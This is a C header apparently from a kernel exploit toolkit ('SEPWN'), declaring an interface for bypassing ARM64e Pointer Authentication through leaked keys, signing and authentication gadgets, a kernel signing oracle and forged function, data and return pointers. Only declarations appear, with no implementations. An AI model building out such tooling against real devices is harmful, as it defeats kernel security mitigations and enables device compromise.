/*
 * pac_bypass.h - PAC (Pointer Authentication) Bypass
 * 
 * This header declares functions for bypassing PAC on ARM64e.
 */

#ifndef SEPWN_PAC_BYPASS_H
#define SEPWN_PAC_BYPASS_H

#include "common.h"

/* PAC Key Types */
typedef enum {
    PAC_KEY_IA = 0,     /* Instruction Address key A */
    PAC_KEY_IB = 1,     /* Instruction Address key B */
    PAC_KEY_DA = 2,     /* Data Address key A */
    PAC_KEY_DB = 3,     /* Data Address key B */
    PAC_KEY_GA = 4,     /* Generic key A */
} pac_key_t;

/* PAC Gadget */
typedef struct {
    kaddr_t address;
    const char *name;
    const char *instruction;
} pac_gadget_t;

/* PAC State */
typedef struct {
    bool initialized;
    kaddr_t kernel_base;
    
    /* Leaked PAC keys (if available) */
    uint64_t key_ia[2];
    uint64_t key_ib[2];
    uint64_t key_da[2];
    uint64_t key_db[2];
    uint64_t key_ga[2];
    bool keys_leaked;
    
    /* Gadget addresses */
    kaddr_t paciza_gadget;
    kaddr_t autiza_gadget;
    kaddr_t pacia_gadget;
    kaddr_t autia_gadget;
    kaddr_t pacda_gadget;
    kaddr_t autda_gadget;
    
    /* Signing oracle */
    kaddr_t signing_oracle;
    
} pac_state_t;

/* Initialization */
int pac_bypass_init(kaddr_t kernel_base, kaddr_t kernel_slide);
void pac_bypass_cleanup(void);
bool pac_bypass_is_initialized(void);

/* PAC Operations */
kptr_t pac_sign_pointer(kaddr_t ptr, uint64_t context, pac_key_t key);
kaddr_t pac_strip_pointer(kptr_t ptr);
bool pac_verify_pointer(kptr_t ptr, uint64_t context, pac_key_t key);

/* Convenience Functions */
kptr_t pac_sign_function_pointer(kaddr_t func_addr, uint64_t context);
kptr_t pac_sign_data_pointer(kaddr_t data_addr, uint64_t context);
kptr_t pac_sign_return_address(kaddr_t ret_addr, kaddr_t sp);

/* Gadget Finding */
int pac_find_gadgets(kaddr_t kernel_base);
const pac_gadget_t* pac_get_gadget(const char *name);

/* Key Leaking */
int pac_leak_keys(void);
bool pac_keys_available(void);

/* Testing */
int pac_bypass_test(void);

#endif /* SEPWN_PAC_BYPASS_H */
